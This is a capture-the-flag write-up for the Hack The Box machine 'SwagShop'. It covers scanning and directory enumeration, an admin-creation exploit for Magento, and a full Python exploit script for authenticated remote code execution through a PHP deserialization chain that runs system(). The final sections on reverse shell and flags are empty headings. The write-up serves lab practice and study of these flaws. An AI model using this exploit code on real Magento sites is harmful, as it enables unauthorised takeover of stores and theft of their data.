## Default Information
IP Address: 10.10.10.140\
OS: Linux

## Discovery

Before we start, let's first add the IP address and the host to our ```/etc/hosts``` file.

```
10.10.10.140    swagshop.htb
```
### Masscan
Firstly, we will use masscan to identify the open ports

```
┌──(kali㉿kali)-[~]
└─$ sudo masscan -p1-65535,U:1-65535 10.10.10.140 --rate=1000 -e tun0 
Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2021-10-08 12:48:00 GMT
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 22/tcp on 10.10.10.140                                    
Discovered open port 80/tcp on 10.10.10.140 
```

### Nmap
We will then use the open ports obtained from masscan to run a scan using nmap to enumerate the services operating behind each port

| Port Number | Service | Version | State |
|-----|------------------|----------------------|----------------------|
| 22	| SSH | OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) | Open |
| 80	| HTTP | Apache httpd 2.4.18 ((Ubuntu)) | Open |

Afterwwards, we will use Nmap to scan for potential vulnerabilties on each of the ports. However, the only vulnerabilities discovered are maninly CSRF, which is not really useful in the machine here.

### Sslyze

### Gobuster
We will then use Gobuster to find the endpoints that are accessible from http://swagshop.htb

```
http://swagshop.htb/media                (Status: 301) [Size: 312] [--> http://swagshop.htb/media/]
http://swagshop.htb/includes             (Status: 301) [Size: 315] [--> http://swagshop.htb/includes/]
http://swagshop.htb/lib                  (Status: 301) [Size: 310] [--> http://swagshop.htb/lib/]
http://swagshop.htb/app                  (Status: 301) [Size: 310] [--> http://swagshop.htb/app/]
http://swagshop.htb/js                   (Status: 301) [Size: 309] [--> http://swagshop.htb/js/]
http://swagshop.htb/shell                (Status: 301) [Size: 312] [--> http://swagshop.htb/shell/]
http://swagshop.htb/skin                 (Status: 301) [Size: 311] [--> http://swagshop.htb/skin/]
http://swagshop.htb/var                  (Status: 301) [Size: 310] [--> http://swagshop.htb/var/]
http://swagshop.htb/errors               (Status: 301) [Size: 313] [--> http://swagshop.htb/errors/]
http://swagshop.htb/mage                 (Status: 200) [Size: 1319]
http://swagshop.htb/server-status        (Status: 403) [Size: 300]
```

We will also tried to find virtual hosts on http://gobuster.htb, but we were unable to find any vhosts.

Next, we will try to use Gobuster to do an enumeration for common files extensions such as .js,.txt,.php and .html.

```
http://swagshop.htb/index.php            (Status: 200) [Size: 16097]
http://swagshop.htb/media                (Status: 301) [Size: 312] [--> http://swagshop.htb/media/]
http://swagshop.htb/includes             (Status: 301) [Size: 315] [--> http://swagshop.htb/includes/]
http://swagshop.htb/lib                  (Status: 301) [Size: 310] [--> http://swagshop.htb/lib/]
http://swagshop.htb/install.php          (Status: 200) [Size: 44]
http://swagshop.htb/app                  (Status: 301) [Size: 310] [--> http://swagshop.htb/app/]
http://swagshop.htb/js                   (Status: 301) [Size: 309] [--> http://swagshop.htb/js/]
http://swagshop.htb/api.php              (Status: 200) [Size: 37]
http://swagshop.htb/shell                (Status: 301) [Size: 312] [--> http://swagshop.htb/shell/]
http://swagshop.htb/skin                 (Status: 301) [Size: 311] [--> http://swagshop.htb/skin/]
http://swagshop.htb/cron.php             (Status: 200) [Size: 0]
http://swagshop.htb/LICENSE.txt          (Status: 200) [Size: 10410]
http://swagshop.htb/LICENSE.html         (Status: 200) [Size: 10679]
http://swagshop.htb/var                  (Status: 301) [Size: 310] [--> http://swagshop.htb/var/]
http://swagshop.htb/errors               (Status: 301) [Size: 313] [--> http://swagshop.htb/errors/]
http://swagshop.htb/mage                 (Status: 200) [Size: 1319]
http://swagshop.htb/server-status        (Status: 403) [Size: 300]
```

### Feroxbuster

Navigating to some of the links, we discover that the endpoints are ```/index.php/checkout/cart```. However, we have not previously enumerated the ```/index.php``` endpoint. We will now enumerate the ```/index.php``` endpoint using Feroxbuster

```
200      327l      904w        0c http://swagshop.htb/index.php/home
200      327l      904w        0c http://swagshop.htb/index.php/0
302        0l        0w        0c http://swagshop.htb/index.php/catalog
200       51l      211w     3609c http://swagshop.htb/index.php/admin
200        0l        0w        0c http://swagshop.htb/index.php/Home
200        0l        0w        0c http://swagshop.htb/index.php/core
200        8l       13w      361c http://swagshop.htb/index.php/api
302        0l        0w        0c http://swagshop.htb/index.php/checkout
302        0l        0w        0c http://swagshop.htb/index.php/wishlist
200      327l      904w        0c http://swagshop.htb/index.php/HOME
200        0l        0w        0c http://swagshop.htb/index.php/customer-service

```
### Web-content discovery

Visiting http://swagshop.htb/index.php/, we are redirected to a home page for Magento and viewing the source code, we realize that we are possibly using Magento Commerce. Additionally, we are also able to know that this version of Magento that we are using is released in 2014.

![Magento version](https://github.com/joelczk/writeups/blob/main/HTB/Images/Swagshop/magento_version.PNG)

Apart from that, we also realize that visiting http://swagshop.htb/index.php/admin brings us to an admin login page.
## Exploit

### CVE-2015-1397

Researching on CVEs for Magento, we were able to find a CVE-2015-1397. Looking at the exploit code, this seems to be an exploit that creates a new user with adminstrator privileges. 

Analysing the exploit script, we realize that the exploit endpoint is ```/admin/Cms_Wysiwyg/directive/index/```, so the target url will most likely have to be http://swagshop.htb/index.php. We will now modify the python script and execute it(NOTE: This exploit only works if we use python2), and the exploit worked.

```
┌──(kali㉿kali)-[~/Desktop]
└─$ python 37977.py                                                               127 ⨯
WORKED
Check http://swagshop.htb/index.php/admin with creds forme:forme
```

Using the credentials forme:forme, we are able to login to the admin interface of the site. Also, we can see from the site that we are using Magento V1.9.0.0

![Magento 1.9.0.0](https://github.com/joelczk/writeups/blob/main/HTB/Images/Swagshop/magento_1.9.0.0.PNG)


### Authenticated RCE on Magento CE < 1.9.0.1

Researching on Magento 1.9.0.0, we were able to find an RCE. However, we have to first modify the script to change the _install_date_ to be the date shown on /app/etc/local.xml.

The exploit code had quite a number of bugs and was unable to run properly on my local machine. So, I decided to rewrite the exploit code.

```python
#!/usr/bin/python
# Exploit Title: Magento CE < 1.9.0.1 Post Auth RCE 
# Google Dork: "Powered by Magento"
# Date: 08/18/2015
# Exploit Author: @Ebrietas0 || http://ebrietas0.blogspot.com
# Vendor Homepage: http://magento.com/
# Software Link: https://www.magentocommerce.com/download
# Version: 1.9.0.1 and below
# Tested on: Ubuntu 15
# CVE : none
# Modified version of rce

from hashlib import md5
import sys
import re
import base64
import mechanize
import argparse

def getPayload(php_function, command):
	payload = 'O:8:\"Zend_Log\":1:{s:11:\"\00*\00_writers\";a:2:{i:0;O:20:\"Zend_Log_Writer_Mail\":4:{s:16:' \
          '\"\00*\00_eventsToMail\";a:3:{i:0;s:11:\"EXTERMINATE\";i:1;s:12:\"EXTERMINATE!\";i:2;s:15:\"' \
          'EXTERMINATE!!!!\";}s:22:\"\00*\00_subjectPrependText\";N;s:10:\"\00*\00_layout\";O:23:\"'     \
          'Zend_Config_Writer_Yaml\":3:{s:15:\"\00*\00_yamlEncoder\";s:%d:\"%s\";s:17:\"\00*\00'     \
          '_loadedSection\";N;s:10:\"\00*\00_config\";O:13:\"Varien_Object\":1:{s:8:\"\00*\00_data\"' \
          ';s:%d:\"%s\";}}s:8:\"\00*\00_mail\";O:9:\"Zend_Mail\":0:{}}i:1;i:2;}}' % (len(php_function), php_function,
                                                                                     len(command), command) 
	return payload
	
def exploit(username, password, installDate, command, targetUrl):
	print("[+] Setting up configurations...")
	print("    - Username: " + str(username))
	print("    - Password: " + str(password))
	print("    - Install Date: " + str(installDate))
	print("    - Command to execute: " + str(command))
	print("    - Target URL: " + str(targetUrl))
	php_function = 'system'
	print("[+] Generating POP chain payload")
	payload = getPayload(php_function, command)
	print("[+] Starting mechanize browser")
	print("[+] Proxy set to 127.0.0.1:8080")
	br = mechanize.Browser()
	br.set_proxies({"http": "127.0.0.1:8080"})
	br.set_handle_robots(False)
	request = br.open(targetUrl)
	br.select_form(nr=0)                                                                
	br.form.fixup()
	br['login[username]'] = username
	br['login[password]'] = password
	br.method = "POST"
	request = br.submit()
	content = request.read()
	print("[+] Successfully logged into admin interface")
	url = re.search("ajaxBlockUrl = \'(.*)\'", content.decode())
	url = url.group(1)
	key = re.search("var FORM_KEY = '(.*)'", content.decode())
	key = key.group(1)
	request = br.open(url + 'block/tab_orders/period/2y/?isAjax=true', data='isAjax=false&form_key=' + key)
	tunnel = re.search("src=\"(.*)\?ga=", request.read().decode())
	tunnel = tunnel.group(1)
	print("[+] Dropping payload...")
	payload = base64.b64encode(payload.encode())
	gh = md5(payload + installDate.encode('utf-8')).hexdigest()
	exploitPayload = tunnel + '?ga=' + payload.decode() + '&h=' + str(gh)
	try:
	    request = br.open(exploitPayload)
	except (mechanize.HTTPError, mechanize.URLError) as e:
	    print (e.read().decode())

if __name__ == '__main__':
	parser = argparse.ArgumentParser()
	parser.add_argument('-u', help='Username')
	parser.add_argument('-p', help='Password')
	parser.add_argument('-d',help='Install date')
	parser.add_argument('-l', help='Exploit URL')
	parser.add_argument('-c', help="Command to execute")
	args = parser.parse_args()
	exploit(args.u, args.p, args.d, args.c, args.l)
```
### Obtaining reverse shell
### Obtaining user flag
### Obtaining root flag